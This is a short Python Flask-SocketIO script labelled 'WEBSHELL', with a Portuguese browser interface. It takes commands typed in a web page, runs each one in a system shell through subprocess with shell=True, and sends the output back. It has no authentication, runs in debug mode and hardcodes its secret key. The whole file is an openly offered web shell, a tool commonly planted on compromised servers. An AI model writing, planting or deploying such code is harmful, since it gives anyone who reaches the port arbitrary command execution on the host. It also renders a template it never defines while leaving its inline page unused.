#!/usr/bin/env python

import subprocess
from flask import Flask, render_template
from flask_socketio import SocketIO, send, emit

HTML = '''
<html>
    <head>
        <title>WEBSHELL</title>
        <script type="text/javascript" src="//code.jquery.com/jquery-3.2.1.min.js"></script>
        <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js"></script>
        <script type="text/javascript" charset="utf-8">
            var socket;
            $(document).ready(function(){
                socket = io.connect('http://' + document.domain + ':' + location.port + '/shell');
                socket.on('connect', function() {
                    socket.emit('joined', {});
                });
                socket.on('message', function(data) {
                    $('#shell').val($('#shell').val() + data.msg + '\n');
                    $('#shell').scrollTop($('#shell')[0].scrollHeight);
                });
                socket.on('status', function(data) {
                    $('#shell').val($('#shell').val() + '<' + data.msg + '>\n');
                    $('#shell').scrollTop($('#shell')[0].scrollHeight);
                });
                $('#text').keypress(function(e) {
                    var code = e.keyCode || e.which;
                    if (code == 13) {
                        text = $('#text').val();
                        $('#text').val('');
                        socket.emit('comando', {msg: text});
                    }
                });
            });
            function leave_room() {
                socket.disconnect();
                window.location.href = "http://www.google.com";
            }
        </script>
    </head>
    <body>
        <h1>WEBSHELL</h1>
        <textarea id="shell" cols="80" rows="20"></textarea><br><br>
        <input id="text" size="80" placeholder="Digite o comando"><br><br>
        <a href="#" onclick="leave_room();">Sair</a>
    </body>
</html>
'''

app = Flask(__name__)
app.config['SECRET_KEY'] = 'top secret'
app.config['DEBUG'] = True
socketio = SocketIO(app)

@app.route('/')
def index():
    return render_template('shell.html')

@socketio.on('joined', namespace='/shell')
def joined(message):
    emit('status', {'msg': 'CONECTADO COM SUCESSO'})
    
@socketio.on('comando', namespace='/shell')
def comando(comando):
    c = comando['msg']
    emit('message', {'msg': '$ ' + c})
    print(c)
    try:
        b = subprocess.check_output(c, shell=True).decode()
    except Exception as err:
        b = str(err)
        
    emit('message', {'msg': b})
    
if __name__ == '__main__':
    socketio.run(app)
    
